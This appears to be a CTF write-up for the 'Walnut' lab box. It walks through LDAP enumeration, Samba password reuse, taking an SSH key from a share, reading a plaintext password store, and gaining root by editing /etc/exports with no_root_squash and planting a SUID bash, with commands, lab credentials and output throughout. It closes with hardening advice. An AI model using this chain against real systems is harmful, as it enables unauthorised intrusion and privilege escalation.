+++
title = "Walnut"
date = 2026-11-15
description = "Assumed-breach Linux box. A password in an LDAP description still works on Samba, the share is a home directory with an SSH key in it, a plaintext password store leads to a job account, and that account can edit /etc/exports and restart NFS."
draft = false

[taxonomies]
tags = ["LDAP enumeration", "Password reuse", "Plaintext credentials", "NFS no_root_squash"]

[extra]
platform = "hacksmarter"
os = "linux"
difficulty = "easy"
chain = ["LDAP description leak", "Samba password reuse", "Plaintext job passwords", "Writable /etc/exports", "no_root_squash"]
+++

Assumed breach again. Kindly provided credentials:

```text
username: larryburns
password: IloveMontgommery!
Host: walnut.local
```

## Recon

```bash
nmap -sCV -p- 10.0.25.49 -v -oN nmap/tcp_full.txt
```

```text
PORT      STATE SERVICE     VERSION
22/tcp    open  ssh         OpenSSH 9.6p1 Ubuntu 3ubuntu13.18 (Ubuntu Linux; protocol 2.0)
111/tcp   open  rpcbind     2-4 (RPC #100000)
139/tcp   open  netbios-ssn Samba smbd 4
389/tcp   open  ldap        OpenLDAP 2.2.X - 2.3.X
445/tcp   open  netbios-ssn Samba smbd 4
2049/tcp  open  nfs_acl     3 (RPC #100227)
32949/tcp open  mountd      1-3 (RPC #100005)
35585/tcp open  mountd      1-3 (RPC #100005)
35977/tcp open  mountd      1-3 (RPC #100005)
38057/tcp open  nlockmgr    1-4 (RPC #100021)
50983/tcp open  status      1 (RPC #100024)
```

SSH, Samba, OpenLDAP and a full NFS stack on an Ubuntu host. NFS is usually the quickest thing to check, so i started there.

### NFS with nothing in it

```bash
showmount -e 10.0.25.49
```

```text
Export list for 10.0.25.49:
```

Empty. i tried mounting a guessed path and the NFSv4 root anyway:

```bash
sudo mount -t nfs -o ro 10.0.25.49:/export /mnt/target-nfs
sudo mount -t nfs4 -o ro 10.0.25.49:/ /mnt/target-nfs
```

```text
mount.nfs: access denied by server while mounting 10.0.25.49:/export
mount.nfs4: access denied by server while mounting 10.0.25.49:/
```

and nmap's NFS scripts agree:

```bash
nmap -p111,2049 --script nfs-ls,nfs-showmount,nfs-statfs 10.0.25.49
```

```text
PORT     STATE SERVICE
111/tcp  open  rpcbind
|_nfs-showmount: No NFS mounts available
2049/tcp open  nfs
```

so mountd, nlockmgr and nfsd are all running and the server exports nothing. Linux mountd lists every export in `showmount`, including the ones your IP isn't allowed to mount, so a blank list means `/etc/exports` is empty. Somebody set up NFS and then never used it, which is strange enough that i wrote it down and moved on to LDAP.

## Enumeration over LDAP

The provided creds bind fine, so dump the whole tree:

```bash
ldapsearch -x -H ldap://10.0.25.49 \
  -D 'uid=larryburns,ou=people,dc=walnut,dc=local' -w 'IloveMontgommery!' \
  -b 'dc=walnut,dc=local'
```

Three users come back: `automation`, `briangeoff` and `larryburns`. The automation entry is the one to read:

```text,hl_lines=16
# automation, People, walnut.local
dn: uid=automation,ou=People,dc=walnut,dc=local
objectClass: inetOrgPerson
objectClass: posixAccount
objectClass: shadowAccount
uid: automation
sn: automation
givenName: automation
cn: automation
displayName: automation
uidNumber: 7789
gidNumber: 7789
gecos: automation
loginShell: /bin/bash
homeDirectory: /home/automation
description: old pw asdh023incasdahff9 please change pw on all servers
```

beautiful. "old pw" and "please change pw on all servers" in the same line reads like a todo that got half done.

The only `userPassword` in the dump is larry's own, so the ACL lets each user read just their own hash. Nothing to crack there.

## Foothold: automation

### the old password still works on Samba

SSH first, buttt:

```bash
ssh automation@10.0.25.49
```

```text
automation@10.0.25.49: Permission denied (publickey).
```

sshd only takes keys, so no password will ever work there. Samba is next:

```bash
nxc smb 10.0.25.49 -u automation -p 'asdh023incasdahff9' --shares
```

```text,hl_lines=2 7
SMB         10.0.25.49      445    WALNUT           [*] Unix - Samba (name:WALNUT) (domain:local) (signing:False) (SMBv1:None) (Null Auth:True)
SMB         10.0.25.49      445    WALNUT           [+] local\automation:asdh023incasdahff9
SMB         10.0.25.49      445    WALNUT           [*] Enumerated shares
SMB         10.0.25.49      445    WALNUT           Share           Permissions     Remark
SMB         10.0.25.49      445    WALNUT           -----           -----------     ------
SMB         10.0.25.49      445    WALNUT           print$          READ            Printer Drivers
SMB         10.0.25.49      445    WALNUT           automation      READ,WRITE      automation share
SMB         10.0.25.49      445    WALNUT           IPC$                            IPC Service (walnut server (Samba, Ubuntu))
```

The old password is still the Samba password. Later, from the box, i tried the same password as an LDAP bind and got `ldap_bind: Invalid credentials (49)`. So the admin did change it in LDAP and forgot that Samba keeps its own password database.

### the share is a home directory

Pull everything down:

```bash
nxc smb 10.0.25.49 -u automation -p 'asdh023incasdahff9' -M spider_plus -o DOWNLOAD=TRUE
```

```bash
ls -la ~/.nxc/modules/nxc_spider_plus/10.0.25.49/automation
```

```text,hl_lines=6
-rw-rw-r-- 1 kali kali    10 15. Nov 12:29 .bash_history
drwxrwxr-x 2 kali kali  4096 15. Nov 12:29 .cache
drwxrwxr-x 2 kali kali  4096 15. Nov 12:29 .hidden
-rw-rw-r-- 1 kali kali    20 15. Nov 12:29 .lesshst
drwxrwxr-x 3 kali kali  4096 15. Nov 12:29 scripts
drwxrwxr-x 2 kali kali  4096 15. Nov 12:29 .ssh
-rw-rw-r-- 1 kali kali    33 15. Nov 12:29 user.txt
-rw-rw-r-- 1 kali kali 11817 15. Nov 12:29 .viminfo
```

That's `/home/automation`, dotfiles and all. `user.txt` is right there, and `.ssh` holds an unencrypted `id_rsa`. sshd wanted a key, and now i have one:

```bash
cp ~/.nxc/modules/nxc_spider_plus/10.0.25.49/automation/.ssh/id_rsa loot/
chmod 600 loot/id_rsa
ssh -i loot/id_rsa automation@10.0.25.49
```

```text
Welcome to Ubuntu 24.04.4 LTS (GNU/Linux 6.8.0-138-generic x86_64)
automation@walnut:~$
```

## Lateral: automation to localjob3

### nothing obvious as automation

```bash
id
```

```text
uid=7789(automation) gid=7789(automation) groups=7789(automation)
```

No groups, no crontab, nothing in `/etc/sudoers.d`. `/home` has four more users i can't look into, `localjob1` to `localjob4`. And `/etc/exports` is as empty as it looked from outside, but the permissions on it are off:

```bash
ls -la /etc/exports
```

```text
-rw-rw-r--+ 1 root root 390 Sep 19  2025 /etc/exports
```

That `+` at the end is an ACL. Somebody other than root is allowed to write this file. As automation i'm not that somebody:

```bash
echo '/ *(rw,sync,no_root_squash,no_subtree_check)' >> /etc/exports
```

```text
-bash: /etc/exports: Permission denied
```

### a password store in .hidden

Back to the home directory. There's a script and a folder that go together:

```bash
cat ~/scripts/runScript.sh
```

```bash
#!/bin/bash

PARM1="$1"
PARM2=`echo -n "$1" | md5sum | cut -d' ' -f 1`
PARM3="$2"
DATE=`date +%d.%m.%Y-%Hh%m.%S`

su - "$PARM1" -c "$PARM3" < /home/automation/.hidden/"$PARM2" > /home/automation/scripts/logs/"$1"-"$DATE".log
```

```bash
ls ~/.hidden/
```

```text
4f378611beed879f4f62a43ac18452a9  af5f60ab1fe78c4a34e37c9cb4cc58b8  b410af005ed0c033fd5e89720fdf2d57  b4d2ab0ea77f3306355ac7b2bcfcd614  b4d2ab0ea77f3306355ac7b2bcfcd614.bak
```

The script runs a command as another user with `su`, and feeds `su` the password on stdin from a file in `.hidden`. The filename is the md5 of the username. So `.hidden` is a plaintext password store, and the md5 only hides which file belongs to whom until you hash four usernames:

```bash
for u in localjob1 localjob2 localjob3 localjob4; do echo "$(echo -n $u | md5sum | cut -d' ' -f1) $u"; done
```

```text
4f378611beed879f4f62a43ac18452a9 localjob1
af5f60ab1fe78c4a34e37c9cb4cc58b8 localjob2
b4d2ab0ea77f3306355ac7b2bcfcd614 localjob3
b410af005ed0c033fd5e89720fdf2d57 localjob4
```

```bash
cat ~/.hidden/*
```

```text
brYfZknjTirtrPgM8V65
cKvFZVPbrxEqCkCLPM70
Q8NPUgCvuBQ636tzFBh3
vyZzRcreRGDjbq9t19Tb
```

The shell expands `*` in sorted order, so the passwords line up with the filenames: localjob1, localjob2, localjob4, localjob3.

### which localjob matters

Four accounts, so ask the file from before who is on its ACL:

```bash
getfacl /etc/exports
```

```text,hl_lines=2
user::rw-
user:localjob3:rw-
group::r--
mask::rw-
other::r--
```

localjob3 it is.

```bash
su - localjob3
sudo -l
```

```text,hl_lines=5
Matching Defaults entries for localjob3 on walnut:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User localjob3 may run the following commands on walnut:
    (ALL) NOPASSWD: /usr/bin/systemctl restart nfs-kernel-server.service
```

and there's the other half. localjob3 can write the export list and restart the service that reads it. That also explains the empty `showmount` from the start: the export on this box is whatever localjob3 puts there.

## Privesc: exporting / with no_root_squash

By default NFS squashes root: a client connecting as uid 0 gets mapped to `nobody` on the server. `no_root_squash` turns that off, so root on my kali is root on the exported filesystem. Export the whole disk that way:

```bash
echo '/ *(rw,sync,no_root_squash,no_subtree_check)' >> /etc/exports
sudo /usr/bin/systemctl restart nfs-kernel-server.service
showmount -e localhost
```

```text
Export list for localhost:
/ *
```

The sudo command has to be typed exactly as the rule has it, `.service` suffix included.

On kali the mount that was denied at the start now goes through:

```bash
sudo mount -t nfs -o vers=3 10.0.25.49:/ /mnt/target-nfs
```

Copy the target's own bash (kali's might not match its glibc), make it root-owned and SUID:

```bash
sudo cp /mnt/target-nfs/usr/bin/bash /mnt/target-nfs/tmp/rootbash
sudo chown root:root /mnt/target-nfs/tmp/rootbash
sudo chmod 4755 /mnt/target-nfs/tmp/rootbash
```

Back in the localjob3 shell:

```bash
/tmp/rootbash -p
id
```

```text
uid=5002(localjob3) gid=5002(localjob3) euid=0(root) groups=5002(localjob3),100(users)
```

`-p` keeps bash from dropping the effective uid. done.

## What could Walnut improve?

- no passwords in LDAP attributes. `description` is readable by every authenticated user.
- a password change has to reach every backend. LDAP got the new one, Samba kept the old one, and that was the way in.
- don't share a whole home directory over SMB, and get rid of the `.hidden` password store. A sudoers rule limited to the one command does the same job without stored passwords.
- write access to `/etc/exports` is root access. If NFS isn't used, turn it off.

What i take from this box is the empty `showmount`. i read it as "nothing here" and almost dropped NFS for good. An NFS server that exports nothing was the hint that the export list is something you get to write later.

## Appendix

- [NetExec](https://github.com/Pennyw0rth/NetExec)
- [exports(5)](https://man7.org/linux/man-pages/man5/exports.5.html), for `no_root_squash`
- [ldapsearch(1)](https://man7.org/linux/man-pages/man1/ldapsearch.1.html)
